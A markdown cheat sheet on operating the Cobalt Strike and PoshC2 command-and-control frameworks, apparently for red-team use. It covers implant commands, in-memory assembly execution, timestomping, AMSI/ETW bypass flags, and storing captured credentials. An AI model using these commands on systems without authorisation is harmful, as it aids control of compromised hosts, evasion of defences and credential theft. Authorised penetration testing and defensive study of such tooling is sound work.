# __Command & Control framework usage__
>Author: Pieter Miske
---
### __Cobalt strike:__
##### _Start team server and client:_
- Start the CS team server: `./teamserver <IP used by the TS> <new password for TS> <malleable.profile>`
- Start the CS client: `./cobaltstrike`

##### _Basic beacon commands:_
- Listing of the available commands: `help`
- Show the help menu of the selected module: `help <module>`
- List the running jobs of beacon: `jobs`
- Kill selected job: `jobkill <id>`
- Execute OS commands by spawning "cmd\.exe /c": `shell <command> (<arguments>)`
- Execute commands by spawning "powershell\.exe": `powershell <command> (<arguments>)`
- Import a local powershell module in the current beacon process: `powershell-import </path/to/script\.ps1>`
- Execute powershell commands without spawning "powershell\.exe", using only \.net libraries and assemblies: `powerpick <command> (<arguments>)`
- Load and execute a \.NET compiled assembly executable completely in memory: `execute-assembly </path/to/local/tool.exe> (<arguments>)`
- Set the interval and jitter of beacon's call back: `sleep <seconds (e.g. 60)> (<jitter (e.g. 50)>)`
- Download file \(stored on the TS or can be viewed via: View > Downloads\): `download <C:\path to file>`
- Upload file: `upload </path/to/file.exe>`
- Change 'Last Modified" timestamp of an altered file to the timestamp of the original file: `timestomp <new file> <original file>`
- Convert returned error code to error message: `net helpmsg <code>`

##### _Aggressor scripts:_
The following aggressor scripts give some extra functionality to CS\. 
- [InlineExecute\-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly): this BOF allows in process \.NET assembly execution as an alternative for execute\-assembly module: `inlineExecute-Assembly --dotnetassembly /<path to tool> --assemblyargs <args> --amsi --etw <--pipe | --mailslot> <pmisvc> --appdomain <ConsoleApp1>`
- [Cobalt\-arsenal](https://github.com/mgeeky/cobalt-arsenal): set of aggressor scripts that add or improve default cobalt strike functionalilities\.
- [HelpColer](https://github.com/outflanknl/HelpColor): lists available Cobalt Strike beacon commands and colors them based on their type\.


---
### __PoshC2:__
##### _Running PoshC2:_
- Download and install the open source [PoshC2](https://github.com/nettitude/PoshC2) project: `sudo ./Install.sh`
- Project management: `sudo posh-project <-n <project_name> | -s <project-to-switch-to> | -l (lists projects) | -d <project-to-delete> | -c (shows current project)>`
- Edit the configuration for your project \(atleast modify BindIP/BindPort and PayloadCommsHost\): `sudo posh-config`
- Launch the PoshC2 server: `sudo posh-server`
- Run the ImplantHandler for interacting with implants \(all output of the implants will show up in the server panel\): `sudo posh -u <random username>`
- Update PoshC2: `posh-update`
- Start new display \(log\) panel \(use this if team members log in via ssh\): `posh-log`

##### _Main menu commands:_
- Add compromised credentials/hashes to the database \(accepts only password or hash\): `creds -add -domain=<domain> -username=<username> -password='<password>'|-hash=<hash>`
- Check all compromised \(stored\) credentials: `creds`
- Message other team members: `message "<Message to broadcast>"`
- Get a detailed overview in both html/cvs format about compromised systems, commands executed on each system and gathered \(if added\) credentials: `generate-reports`
- Quick overview of compromised hosts, used URL's, files uploaded and \(if added\) gathered credentials: `opsec`
- Show detailed information about the running server: `show-serverinfo`

##### _General Commands:_
- Get overview of all command: `help`
- Get overview of all available modules: `listmodules`
- Change beacon call\-back time of running implant \(run in implant interface\): `beacon <number in seconds>s`
- Set beacon call\-back time for new implants \(run in "select implant" interface\): `set-defaultbeacon <number in seconds>s`
- Label an implant with text: `label-implant <label text>`
- Load PowerShell script in C\# implant: `pslo <scriptname.ps1>`
- Execute PowerShell command in C\# implant: `sharpps <normal PS syntax>`
- Upload file \(if the source address is not correct it will completely brake the C2 server\): `upload-file -source /<local path> -destination "C:\Users\Public\Documents\<file>"`
- Download file \(stored in /var/poshc2/<project>/downloads/\): `download-file "c:\<path to file>"`
- Run C\# \.NET binaries \(\.exe and \.dll\):
	- 1\. Add C\# \.NET assembly in the ‘modules’ folder and load the module: `loadmodule <name executable>`   
	- 2\. Run C\# binary \(if the program is not giving any output, the only solution is to respawn a C\# implant\): `run.exe <namespace>.<classname> <assembly name> <args>`

##### _Tips & Tricks:_
- In the file “/PoshC2/resources/urls\.txt” you can specify multiple URL's that the beacons will use\.
- PowerShell implants will automaticly migrade to a new process that is specified in the posh\-config file "DefaultMigrationProcess" attribute\.  
- Quickstart document can be found in "/var/poshc2/<project name>/quickstart\.txt"
- All payloads are stored in "/var/poshc2/<project name>/payloads/"
- Create an alias for a C\# assembly or powershell script "/opt/Poshc2/poshc2/client/Alias\.py"
- All downloaded files and screenshots are stored in the directory "/var/poshc2/<name project>/downloads/"


